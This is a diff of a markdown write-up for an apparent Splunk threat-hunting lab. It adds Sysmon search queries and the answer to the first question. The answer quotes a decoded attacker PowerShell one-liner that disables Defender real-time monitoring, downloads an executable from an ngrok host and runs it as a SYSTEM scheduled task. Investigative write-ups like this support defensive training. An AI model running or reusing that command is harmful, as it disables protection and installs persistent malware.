@@ -13,7 +13,7 @@ Your manager has tasked you to check the events in Splunk to determine what occu
 Happy Hunting!
 
 ## Tools Used
-- CyberChef
+- dCode
 - Splunk
 - VirusTotal
 
@@ -22,6 +22,20 @@ Happy Hunting!
 
 ## Answer the questions below
 ### 1. A suspicious binary was downloaded to the endpoint. What was the name of the binary?
+To filter out the logs, the initial search query was `index=main ComputerName=DESKTOP-TBV8NEF sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=11 Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`.
+
+Next, the `TargetFilename` field was investigated to determine the suspicious binary.
+
+One of the files that stood out was `OUTSTANDING_GUTTER.exe` as the file name is unusual and it's saved in the `C:\Windows\Temp\` directory, one of the common staging areas that attackers use.
+
+However to further verify that this was the suspicious file, the process creation event from the file creation alert of the binary was investigated. To find this in the logs, the search query was `index=main ComputerName=DESKTOP-TBV8NEF sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational ProcessGuid: {eea302a0-51cb-6282-d00e-000000000300} ProcessId: 10224  Description="Windows PowerShell"`
+
+An encoded PowerShell command was discovered. With the help of dCode, the command was decoded as `Set-MpPreference -DisableRealtimeMonitoring $true;wget http://886e-181-215-214-32.ngrok.io/OUTSTANDING_GUTTER.exe -OutFile C:\Windows\Temp\OUTSTANDING_GUTTER.exe;SCHTASKS /Create /TN "OUTSTANDING_GUTTER.exe" /TR "C:\Windows\Temp\COUTSTANDING_GUTTER.exe" /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU "SYSTEM" /f;SCHTASKS /Run /TN "OUTSTANDING_GUTTER.exe"`.
+
+These evidences prove that <mark>`OUTSTANDING_GUTTER.exe`</mark> was the suspicious binary.
+
+What makes this more suspicious is that it disables the real-time monitoring of Microsoft Defender. Moreover it must be noted that the binary was also used in a scheduled task.
+
 
 ### 2. What is the address the binary was downloaded from? Add http:// to your answer & defang the URL.
 
